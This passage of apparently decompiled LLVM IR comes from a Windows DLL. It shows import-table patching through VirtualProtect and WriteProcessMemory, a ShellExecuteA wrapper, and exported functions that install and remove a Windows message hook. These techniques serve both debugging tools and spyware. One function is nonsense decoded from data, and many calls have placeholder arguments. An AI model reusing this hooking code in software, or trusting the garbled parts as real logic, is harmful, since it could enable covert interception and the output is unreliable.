  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !392
}

define i32 @function_404b78(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b78:
  %eax.0.reg2mem = alloca i32, !insn.addr !393
  %esp.0.reg2mem = alloca i32, !insn.addr !393
  %storemerge6.reg2mem = alloca i32, !insn.addr !393
  %.reg2mem14 = alloca i32, !insn.addr !393
  %esp.17.reg2mem = alloca i32, !insn.addr !393
  %esi.08.reg2mem = alloca i32, !insn.addr !393
  %.reg2mem = alloca i32, !insn.addr !393
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !394
  %4 = icmp eq i1 %3, false, !insn.addr !395
  %5 = icmp eq i32 %arg1, 0, !insn.addr !396
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_404c25, label %dec_label_pc_404b9e, !insn.addr !395

dec_label_pc_404b9e:                              ; preds = %dec_label_pc_404b78
  %6 = trunc i32 %2 to i16, !insn.addr !397
  %7 = trunc i32 %1 to i8, !insn.addr !398
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !399
  %8 = inttoptr i32 %0 to i32*, !insn.addr !400
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !400
  %10 = ptrtoint i32* %9 to i32, !insn.addr !400
  %11 = icmp eq i32* %9, null, !insn.addr !401
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !402
  br i1 %11, label %dec_label_pc_404c25, label %dec_label_pc_404c1e.preheader, !insn.addr !402

dec_label_pc_404c1e.preheader:                    ; preds = %dec_label_pc_404b9e
  %12 = add i32 %10, 12, !insn.addr !403
  %13 = inttoptr i32 %12 to i32*, !insn.addr !403
  %14 = load i32, i32* %13, align 4, !insn.addr !403
  %15 = icmp eq i32 %14, 0, !insn.addr !404
  %16 = icmp eq i1 %15, false, !insn.addr !405
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !405
  br i1 %16, label %dec_label_pc_404bb7.lr.ph, label %dec_label_pc_404c25, !insn.addr !405

dec_label_pc_404bb7.lr.ph:                        ; preds = %dec_label_pc_404c1e.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !399
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !406
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_404bb7

dec_label_pc_404bb7:                              ; preds = %dec_label_pc_404bb7.lr.ph, %dec_label_pc_404c1b
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !407
  %24 = add i32 %esp.17.reload, -4, !insn.addr !408
  %25 = inttoptr i32 %24 to i32*, !insn.addr !408
  store i32 %18, i32* %25, align 4, !insn.addr !408
  %26 = add i32 %esp.17.reload, -8, !insn.addr !409
  %27 = inttoptr i32 %26 to i32*, !insn.addr !409
  store i32 %23, i32* %27, align 4, !insn.addr !409
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !410
  %29 = icmp eq i32 %28, 0, !insn.addr !411
  %30 = icmp eq i1 %29, false, !insn.addr !412
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !412
  br i1 %30, label %dec_label_pc_404c1b, label %dec_label_pc_404bca, !insn.addr !412

dec_label_pc_404bca:                              ; preds = %dec_label_pc_404bb7
  %31 = add i32 %esi.08.reload, 16, !insn.addr !413
  %32 = inttoptr i32 %31 to i32*, !insn.addr !413
  %33 = load i32, i32* %32, align 4, !insn.addr !413
  %34 = add i32 %33, %arg1, !insn.addr !414
  %35 = inttoptr i32 %34 to i32*, !insn.addr !415
  %36 = load i32, i32* %35, align 4, !insn.addr !415
  %37 = icmp eq i32 %36, 0, !insn.addr !416
  %38 = icmp eq i1 %37, false, !insn.addr !417
  store i32 %36, i32* %.reg2mem14, !insn.addr !417
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !417
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !417
  br i1 %38, label %dec_label_pc_404bd2, label %dec_label_pc_404c1b, !insn.addr !417

dec_label_pc_404bd2:                              ; preds = %dec_label_pc_404bca, %dec_label_pc_404c12
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !418
  %40 = icmp eq i1 %39, false, !insn.addr !419
  br i1 %40, label %dec_label_pc_404c12, label %dec_label_pc_404bd7, !insn.addr !419

dec_label_pc_404bd7:                              ; preds = %dec_label_pc_404bd2
  %41 = add i32 %esp.17.reload, -12, !insn.addr !420
  %42 = inttoptr i32 %41 to i32*, !insn.addr !420
  store i32 %20, i32* %42, align 4, !insn.addr !420
  %43 = add i32 %esp.17.reload, -16, !insn.addr !421
  %44 = inttoptr i32 %43 to i32*, !insn.addr !421
  store i32 128, i32* %44, align 4, !insn.addr !421
  %45 = add i32 %esp.17.reload, -20, !insn.addr !422
  %46 = inttoptr i32 %45 to i32*, !insn.addr !422
  store i32 4, i32* %46, align 4, !insn.addr !422
  %47 = add i32 %esp.17.reload, -24, !insn.addr !423
  %48 = inttoptr i32 %47 to i32*, !insn.addr !423
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !423
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !424
  %50 = add i32 %esp.17.reload, -28, !insn.addr !425
  %51 = inttoptr i32 %50 to i32*, !insn.addr !425
  store i32 %21, i32* %51, align 4, !insn.addr !425
  %52 = add i32 %esp.17.reload, -32, !insn.addr !426
  %53 = inttoptr i32 %52 to i32*, !insn.addr !426
  store i32 4, i32* %53, align 4, !insn.addr !426
  %54 = add i32 %esp.17.reload, -36, !insn.addr !427
  %55 = inttoptr i32 %54 to i32*, !insn.addr !427
  store i32 %22, i32* %55, align 4, !insn.addr !427
  %56 = add i32 %esp.17.reload, -40, !insn.addr !428
  %57 = inttoptr i32 %56 to i32*, !insn.addr !428
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !428
  %58 = call i32* @GetCurrentProcess(), !insn.addr !429
  %59 = ptrtoint i32* %58 to i32, !insn.addr !429
  %60 = add i32 %esp.17.reload, -44, !insn.addr !430
  %61 = inttoptr i32 %60 to i32*, !insn.addr !430
  store i32 %59, i32* %61, align 4, !insn.addr !430
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !431
  %63 = add i32 %esp.17.reload, -48, !insn.addr !432
  %64 = inttoptr i32 %63 to i32*, !insn.addr !432
  store i32 %21, i32* %64, align 4, !insn.addr !432
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !433
  %66 = add i32 %esp.17.reload, -52, !insn.addr !434
  %67 = inttoptr i32 %66 to i32*, !insn.addr !434
  store i32 %65, i32* %67, align 4, !insn.addr !434
  %68 = add i32 %esp.17.reload, -56, !insn.addr !435
  %69 = inttoptr i32 %68 to i32*, !insn.addr !435
  store i32 4, i32* %69, align 4, !insn.addr !435
  %70 = add i32 %esp.17.reload, -60, !insn.addr !436
  %71 = inttoptr i32 %70 to i32*, !insn.addr !436
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !436
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !437
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !438
  br label %dec_label_pc_404c1b, !insn.addr !438

dec_label_pc_404c12:                              ; preds = %dec_label_pc_404bd2
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !439
  %74 = inttoptr i32 %73 to i32*, !insn.addr !415
  %75 = load i32, i32* %74, align 4, !insn.addr !415
  %76 = icmp eq i32 %75, 0, !insn.addr !416
  %77 = icmp eq i1 %76, false, !insn.addr !417
  store i32 %75, i32* %.reg2mem14, !insn.addr !417
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !417
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !417
  br i1 %77, label %dec_label_pc_404bd2, label %dec_label_pc_404c1b, !insn.addr !417

dec_label_pc_404c1b:                              ; preds = %dec_label_pc_404c12, %dec_label_pc_404bca, %dec_label_pc_404bd7, %dec_label_pc_404bb7
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !440
  %79 = add i32 %esi.08.reload, 32, !insn.addr !403
  %80 = inttoptr i32 %79 to i32*, !insn.addr !403
  %81 = load i32, i32* %80, align 4, !insn.addr !403
  %82 = icmp eq i32 %81, 0, !insn.addr !404
  %83 = icmp eq i1 %82, false, !insn.addr !405
  store i32 %81, i32* %.reg2mem, !insn.addr !405
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !405
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !405
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !405
  br i1 %83, label %dec_label_pc_404bb7, label %dec_label_pc_404c25, !insn.addr !405

dec_label_pc_404c25:                              ; preds = %dec_label_pc_404c1b, %dec_label_pc_404c1e.preheader, %dec_label_pc_404b9e, %dec_label_pc_404b78
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !441
}

define i32 @function_404c30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404c30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !442
  %2 = inttoptr i32 %1 to i32*, !insn.addr !442
  %3 = load i32, i32* %2, align 4, !insn.addr !442
  ret i32 %3, !insn.addr !443
}

define i32 @function_404c34() local_unnamed_addr {
dec_label_pc_404c34:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !444
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !444
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !444
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !445
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !446
  %3 = add i32 %2, 1, !insn.addr !446
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !446
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !447
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !448
  ret i32 0, !insn.addr !449
}

define i32 @function_404c59() local_unnamed_addr {
dec_label_pc_404c59:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !450
  ret i32 %0, !insn.addr !450
}

define i32 @function_404c5e() local_unnamed_addr {
dec_label_pc_404c5e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !451
}

define i32 @function_404c60(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c60:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !452
}

define i32 @function_404c64() local_unnamed_addr {
dec_label_pc_404c64:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !453
  %2 = add i32 %1, -1, !insn.addr !453
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !453
  ret i32 %0, !insn.addr !454
}

define i32* @function_404c6c(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404c6c:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !455
  ret i32* %0, !insn.addr !455
}

define i32 @function_404c74() local_unnamed_addr {
dec_label_pc_404c74:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !456
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !456
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !456
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !457
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !458
  %3 = add i32 %2, 1, !insn.addr !458
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !458
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !459
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !460
  ret i32 0, !insn.addr !461
}

define i32 @function_404c99() local_unnamed_addr {
dec_label_pc_404c99:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !462
  ret i32 %0, !insn.addr !462
}

define i32 @function_404c9e() local_unnamed_addr {
dec_label_pc_404c9e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !463
}

define i32 @function_404ca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ca0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !464
}

define i32 @function_404ca4() local_unnamed_addr {
dec_label_pc_404ca4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !465
  %2 = add i32 %1, -1, !insn.addr !465
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !465
  ret i32 %0, !insn.addr !466
}

define i32 @function_404cac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404cac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_404c30(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !467
  ret i32 %3, !insn.addr !468
}

define i32 @function_404cf8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404cf8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !469
  %2 = icmp eq i1 %1, false, !insn.addr !470
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_404c30(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !471
  ret i32 %3, !insn.addr !472
}

define i32 @function_404d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404d28:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !473
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !473
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !473
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !474
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !475
  %3 = call i32 @"@LStrPos"(), !insn.addr !476
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_404e00 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !477
  %6 = call i32 @"@LStrPos"(), !insn.addr !478
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_404e00 to i32)
  %8 = call i32 @function_404c30(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !479
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !480
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !481
  ret i32 %9, !insn.addr !482
}

define i32 @function_404dc0() local_unnamed_addr {
dec_label_pc_404dc0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !483
  ret i32 %0, !insn.addr !483
}

define i32 @function_404dc5() local_unnamed_addr {
dec_label_pc_404dc5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !484
}

define i32 @function_404dc7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404dc7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !485
}

define i32 @function_404dd7() local_unnamed_addr {
dec_label_pc_404dd7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !486
}

define i32 @function_404e24() local_unnamed_addr {
dec_label_pc_404e24:
  %0 = call i32 @function_404aa4(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404ea0, i32 0, i32 0), i32 4213932), !insn.addr !487
  store i32 %0, i32* @global_var_4080f8, align 4, !insn.addr !488
  %1 = call i32 @function_404aa4(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e94, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ebc, i32 0, i32 0), i32 4214008), !insn.addr !489
  store i32 %1, i32* @global_var_4080fc, align 4, !insn.addr !490
  %2 = call i32 @function_404aa4(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ed4, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_404ee0, i32 0, i32 0), i32 4214056), !insn.addr !491
  store i32 %2, i32* @global_var_408100, align 4, !insn.addr !492
  ret i32 %2, !insn.addr !493
}

define i32 @function_404e94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15, i32 %arg16) local_unnamed_addr {
dec_label_pc_404e94:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !494
  br i1 %10, label %dec_label_pc_404f09, label %dec_label_pc_404e96, !insn.addr !494

dec_label_pc_404e96:                              ; preds = %dec_label_pc_404e94
  br i1 %8, label %dec_label_pc_404ecc, label %dec_label_pc_404e99, !insn.addr !495

dec_label_pc_404e99:                              ; preds = %dec_label_pc_404e96
  %11 = trunc i32 %4 to i16, !insn.addr !496
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !496
  %13 = inttoptr i32 %0 to i8*, !insn.addr !496
  store i8 %12, i8* %13, align 1, !insn.addr !496
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !497
  store i8 %14, i8* %13, align 1, !insn.addr !497
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !498
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !498
  %19 = add i8 %16, %18, !insn.addr !498
  %20 = inttoptr i32 %17 to i8*, !insn.addr !498
  store i8 %19, i8* %20, align 1, !insn.addr !498
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !499
  %21 = trunc i32 %arg10 to i16, !insn.addr !500
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !500
  %23 = inttoptr i32 %9 to i32*, !insn.addr !500
  store i32 %22, i32* %23, align 4, !insn.addr !500
  store i32 %arg1, i32* %eax, align 4, !insn.addr !501
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !502
  %25 = load i8, i8* %24, align 1, !insn.addr !502
  %26 = trunc i32 %arg1 to i8, !insn.addr !502
  %27 = add i8 %25, %26, !insn.addr !502
  store i8 %27, i8* %24, align 1, !insn.addr !502
  %28 = trunc i32 %arg3 to i16, !insn.addr !503
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !503
  %30 = load i32, i32* %29, align 4, !insn.addr !503
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !503
  %31 = add i32 %arg5, 67, !insn.addr !504
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !504
  %34 = load i32, i32* %33, align 4, !insn.addr !504
  %35 = load i8, i8* %24, align 1, !insn.addr !505
  %36 = add i8 %35, %26, !insn.addr !505
  store i8 %36, i8* %24, align 1, !insn.addr !505
  %37 = mul i32 %34, 1557718248, !insn.addr !506
  %38 = add i32 %arg7, 97, !insn.addr !506
  %39 = add i32 %38, %37, !insn.addr !506
  %40 = inttoptr i32 %39 to i8*, !insn.addr !506
  %41 = load i8, i8* %40, align 1, !insn.addr !506
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !506
  %44 = add i8 %43, %41, !insn.addr !506
  %45 = icmp eq i8 %44, 0, !insn.addr !506
  store i8 %44, i8* %40, align 1, !insn.addr !506
  br i1 %45, label %dec_label_pc_404f35, label %dec_label_pc_404ec3, !insn.addr !507

dec_label_pc_404ec3:                              ; preds = %dec_label_pc_404e99
  %46 = load i32, i32* %eax, align 4, !insn.addr !508
  ret i32 %46, !insn.addr !508

dec_label_pc_404ecc:                              ; preds = %dec_label_pc_404e96
  %47 = trunc i32 %6 to i8
  %48 = mul i32 %1, 256
  %49 = and i32 %48, 65280
  %50 = xor i32 %5, %49, !insn.addr !509
  %51 = bitcast i32* %eax to i8*
  %52 = mul i8 %47, 2, !insn.addr !510
  %53 = inttoptr i32 %6 to i8*, !insn.addr !510
  store i8 %52, i8* %53, align 1, !insn.addr !510
  %54 = add i32 %3, 104, !insn.addr !511
  %55 = inttoptr i32 %54 to i8*, !insn.addr !511
  %56 = load i8, i8* %55, align 1, !insn.addr !511
  %57 = udiv i32 %4, 256, !insn.addr !511
  %58 = trunc i32 %57 to i8, !insn.addr !511
  %59 = add i8 %56, %58, !insn.addr !511
  store i8 %59, i8* %55, align 1, !insn.addr !511
  %60 = trunc i32 %4 to i16, !insn.addr !512
  %61 = call i8 @__asm_insb(i16 %60), !insn.addr !512
  %62 = inttoptr i32 %0 to i8*, !insn.addr !512
  store i8 %61, i8* %62, align 1, !insn.addr !512
  %63 = call i8 @__asm_insb(i16 %60), !insn.addr !513
  store i8 %63, i8* %62, align 1, !insn.addr !513
  %64 = xor i32 %4, %1, !insn.addr !514
  %65 = call i8 @__asm_insb(i16 %60), !insn.addr !515
  store i8 %65, i8* %62, align 1, !insn.addr !515
  %66 = call i8 @__asm_insb(i16 %60), !insn.addr !516
  store i8 %66, i8* %62, align 1, !insn.addr !516
  %67 = load i8, i8* %55, align 1, !insn.addr !517
  %68 = trunc i32 %4 to i8, !insn.addr !517
  %69 = add i8 %67, %68, !insn.addr !517
  store i8 %69, i8* %55, align 1, !insn.addr !517
  %70 = call i8 @__asm_insb(i16 %60), !insn.addr !518
  store i8 %70, i8* %62, align 1, !insn.addr !518
  %71 = call i8 @__asm_insb(i16 %60), !insn.addr !519
  store i8 %71, i8* %62, align 1, !insn.addr !519
  %72 = add i32 %2, 117, !insn.addr !520
  %73 = inttoptr i32 %72 to i16*, !insn.addr !520
  %74 = load i16, i16* %73, align 2, !insn.addr !520
  %75 = trunc i32 %64 to i16, !insn.addr !520
  call void @__asm_arpl(i16 %74, i16 %75), !insn.addr !520
  %76 = load i8, i8* %51, align 4, !insn.addr !521
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !521
  %79 = add i8 %76, %78, !insn.addr !521
  %80 = inttoptr i32 %77 to i8*, !insn.addr !521
  store i8 %79, i8* %80, align 1, !insn.addr !521
  %81 = add i32 %50, 82, !insn.addr !522
  %82 = inttoptr i32 %81 to i8*, !insn.addr !522
  %83 = load i8, i8* %82, align 1, !insn.addr !522
  %84 = add i8 %83, %68, !insn.addr !522
  store i8 %84, i8* %82, align 1, !insn.addr !522
  %85 = load i32, i32* %eax, align 4, !insn.addr !523
  %86 = add i32 %85, -1, !insn.addr !523
  %87 = add i32 %50, 4227321, !insn.addr !524
  %88 = inttoptr i32 %87 to i8*, !insn.addr !524
  %89 = load i8, i8* %88, align 1, !insn.addr !524
  %90 = udiv i32 %86, 256, !insn.addr !524
  %91 = trunc i32 %90 to i8, !insn.addr !524
  %92 = add i8 %89, %91, !insn.addr !524
  store i8 %92, i8* %88, align 1, !insn.addr !524
  ret i32 %86, !insn.addr !524

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404e94
  ret i32 %6, !insn.addr !525

dec_label_pc_404f35:                              ; preds = %dec_label_pc_404e99
  %93 = call i32 @CallNextHookEx(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !526
  ret i32 %93, !insn.addr !527
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_404f40:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4214560 to i32*), i32 3), !insn.addr !528
  %2 = ptrtoint i32* %1 to i32, !insn.addr !528
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !529
  %3 = icmp eq i32* %1, null, !insn.addr !530
  %4 = icmp eq i1 %3, false, !insn.addr !531
  %5 = sext i1 %4 to i32, !insn.addr !532
  ret i32 %5, !insn.addr !533
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_404f6c:
  %0 = load i32, i32* @global_var_40969c, align 4, !insn.addr !534
  %1 = inttoptr i32 %0 to i32*, !insn.addr !535
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !535
  %3 = sext i1 %2 to i32, !insn.addr !535
  ret i32 %3, !insn.addr !536
}

define i32 @function_404f78() local_unnamed_addr {
dec_label_pc_404f78:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !537
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !537
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !537
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !538
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !539
  %3 = add i32 %2, 1, !insn.addr !539
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !539
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !540
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !541
  ret i32 0, !insn.addr !542
}

define i32 @function_404f9d() local_unnamed_addr {
dec_label_pc_404f9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !543
  ret i32 %0, !insn.addr !543
}

define i32 @function_404fa2() local_unnamed_addr {
dec_label_pc_404fa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !544
}

define i32 @function_404fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !545
}

define i32 @function_404fa8() local_unnamed_addr {
dec_label_pc_404fa8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !546
  %2 = add i32 %1, -1, !insn.addr !546
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !546
  ret i32 %0, !insn.addr !547
}

define i32 @function_404fb0() local_unnamed_addr {
dec_label_pc_404fb0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !548
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !548
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !548
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !549
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !550
  %3 = add i32 %2, 1, !insn.addr !550
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !550
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !551
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !552
  ret i32 0, !insn.addr !553
}

define i32 @function_404fd5() local_unnamed_addr {
dec_label_pc_404fd5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !554
  ret i32 %0, !insn.addr !554
}

define i32 @function_404fda() local_unnamed_addr {
dec_label_pc_404fda:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !555
}

define i32 @function_404fdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fdc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !556
}

define i32 @function_404fe0() local_unnamed_addr {
dec_label_pc_404fe0:
